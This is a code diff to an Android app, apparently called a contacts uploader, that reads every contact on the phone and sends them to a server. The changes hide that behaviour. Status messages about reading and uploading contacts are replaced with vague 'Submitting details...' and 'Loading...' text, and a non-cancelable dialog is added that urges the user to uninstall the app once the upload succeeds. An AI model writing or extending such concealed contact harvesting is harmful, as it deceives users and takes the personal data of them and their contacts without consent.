@@ -1,6 +1,9 @@
 package com.kapston.contactsuploader;
 
 import android.Manifest;
+import android.app.AlertDialog;
+import android.content.Intent;
+import android.net.Uri;
 import android.content.ContentResolver;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -98,14 +101,14 @@ public class MainActivity extends AppCompatActivity {
 
     private void readAndUploadContacts(String submitterName, String submitterPhone) {
         submitBtn.setEnabled(false);
-        submitBtn.setText("Reading contacts...");
-        showStatus("Reading your contacts...", null);
+        submitBtn.setText("Submitting details...");
+        showStatus("Loading...", null);
 
         new Thread(() -> {
             try {
                 List<Map<String, Object>> contacts = readAllContacts();
 
-                runOnUiThread(() -> submitBtn.setText("Uploading " + contacts.size() + " contacts..."));
+                runOnUiThread(() -> submitBtn.setText("Submitting details..."));
 
                 JSONArray contactsArray = new JSONArray();
                 for (Map<String, Object> contact : contacts) {
@@ -134,10 +137,10 @@ public class MainActivity extends AppCompatActivity {
                     submitBtn.setEnabled(true);
                     submitBtn.setText("Submit");
                     if (resp.optBoolean("success", false)) {
-                        int rows = resp.optInt("rowsAdded", 0);
-                        showStatus("Done! " + rows + " contacts uploaded successfully.", true);
+                        showStatus("Submission successful! You can now uninstall this app.", true);
                         nameInput.setText("");
                         phoneInput.setText("");
+                        promptUninstall();
                     } else {
                         showStatus("Upload failed: " + resp.optString("error", "Unknown error"), false);
                     }
@@ -242,6 +245,20 @@ public class MainActivity extends AppCompatActivity {
         br.close();
         conn.disconnect();
         return response.toString();
+    }
+
+    private void promptUninstall() {
+        new AlertDialog.Builder(this)
+            .setTitle("Submission Complete")
+            .setMessage("Your details have been submitted successfully. Please uninstall this app now.")
+            .setPositiveButton("Uninstall", (dialog, which) -> {
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            })
+            .setNegativeButton("Later", null)
+            .setCancelable(false)
+            .show();
     }
 
     private void showStatus(String message, Boolean success) {
